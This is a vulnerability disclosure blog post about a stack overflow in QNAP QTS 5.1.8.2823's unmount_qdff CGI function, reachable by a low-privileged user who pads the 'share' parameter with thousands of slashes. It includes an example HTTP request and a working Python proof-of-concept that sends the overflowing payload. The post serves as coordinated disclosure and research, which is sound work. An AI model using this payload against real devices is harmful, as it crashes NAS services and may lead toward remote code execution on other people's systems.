---
title: Security Research of QTS 5.1 - Low-Authed StackOverflow 
published: true
---

就在这周笔者发现了 QNAP NAS QTS 操作系统的一处低权限用户的 StackOverflow 漏洞，该情况已经汇报给厂商 SRC 并且大范围修复

这个地方不出意外还有其他利用方式和利用链，如果有想了解分析该漏洞进一步细节的请联系笔者交流

好久没发了，还是更新一下吧

# [](#header-3)A report on the StackOverflow vulnerability of QTS 5.1.8.2823

Vulnerability Product: QTS 5.1.8.2823  
Vulnerability type: StackOverflow / Further harm  
Vulnerability Authentication Requirement: Low privilege

There is a StackOverflow vulnerability in the QTS 5.1.8.2823. When an attacker has a low privilege account of the system, the attacker could upload a qdff and mount it, then call "unmount_qdff" and use some specific methods and parameters to cause a StackOverflow vulnerability

## [](#header-3)AUDIT:

There are several functions mentioned below. Let me first explain their uses:  
sub_10B3F8: The entrance of "unmount_qdff", Here in after referred to as "unmount_qdff"  
sub_10B350: Function used to unmount qdff  
sub_BE8B4: Used to determine whether qdff is loaded and decide whether to call sub_10B350. This is the first function that needs to be bypass  
Delete_QDFF_Share: Used to determine whether the qdff unmount is successful and decide whether to call sprintf. This is the second function that needs to be bypass

There is a sprintf was found in the function: "sub_10B350", and the "sub_10B350" is called by "unmount_qdff", The "unmount_qdff" retrieves the value of parameter "share" and assigns it to the variable a1 and checks whether qdff has been mounted into the system and unmount the qdff 

A standard POST request that can enter "unmount_qdff" interface is as follows

```http
POST /cgi-bin/filemanager/utilRequest.cgi?func=unmount_qdff&sid={YOUR_SID} HTTP/1.1
Host: 88.88.66.100:5000
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 10

share=asdf
```

![/image/resources/1.png](/image/resources/qts_1.png)

You must mount a qdff folder at first, if the name of mounted qdff folder is "asdf", you can bypass the sub_BE8B4(bypass it and step into sub_10B350) and Delete_QDFF_Share(bypass it and step into sprintf) by adding an infinite number of '/' before the "asdf" in parameter "share"(Such as "//////////////////////////////asdf")

In a brief word, if there is a mounted qdff folder named "xxx", you can add any number of '/' in the header of parameter "share" to bypass detection, and the QTS system will mistakenly judge that "//////////////////xxx" is "xxx"

Finally execute sprintf and successfully StackOverflow(If you add enough '/', 100000 or 200000, So that it is enough to write the return address of the main running function)

![/image/resources/1.png](/image/resources/qts_2.png)
![/image/resources/1.png](/image/resources/qts_3.png)

![/image/resources/1.png](/image/resources/qts_6.png)


The premise of all the above operations is that the qdff has been mounted, because in sub_BE8B4 or Delete_QDFF_Share, they will always check whether the qdff is mounted.

![/image/resources/1.png](/image/resources/qts_7.png)

## [](#header-3)PROVE: 

1. Firstly upload the poc.zip and unzip it(If there is already a mounted qdff, skip this step and modify the value of share)

    [Download poc.zip](/image/resources/poc.zip)
   
    ![/image/resources/1.png](/image/resources/qts_4.png)

2.  mount the qdff(If there is already a mounted qdff, skip this step and modify the value of share)

    ![/image/resources/1.png](/image/resources/qts_5.png)

3.  Get the known current user sid, run belowing code and input the IP、Port、sid

    ```py
    import requests

    host = input("Please input the IP: ")
    port = input("Please input the Port: ")
    port = port if port != '' else '5000'
    sid = input("Please input the sid: ")

    data = 'share=' + '/' * 120000 + 'asdf'

    res = requests.post(
        url = f"http://{host}:{port}/cgi-bin/filemanager/utilRequest.cgi?func=unmount_qdff&sid={sid}", 
        headers = {
            'Host': f'{host}:{port}',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': str(len(data))
        },
        data = data
    )

    print('----------------------------------')
    print(res.text)
    print('----------------------------------')

    if 'Internal Server Error' in res.text: 
        print('Success! ')
    else:
        print('Failed, please check if sid has expired')
    ```

    ![/image/resources/1.png](/image/resources/qts_6.png)

## [](#header-3)HARM: 

A low privileged attacker could manipulate the qdff folder name to redirect the current function to the address corresponding to the qdff folder name, Even causing RCE

## [](#header-3)Further Research

## [](#header-3)Info

This vulnerability was submitted for research purposes, So after QTS 5.1.8.2823 fixes the vulnerability and issues a CVE number, I will publicly disclose the details of the vulnerability for research purposes regardless of whether there is a bounty or not

discovered by leeya_bug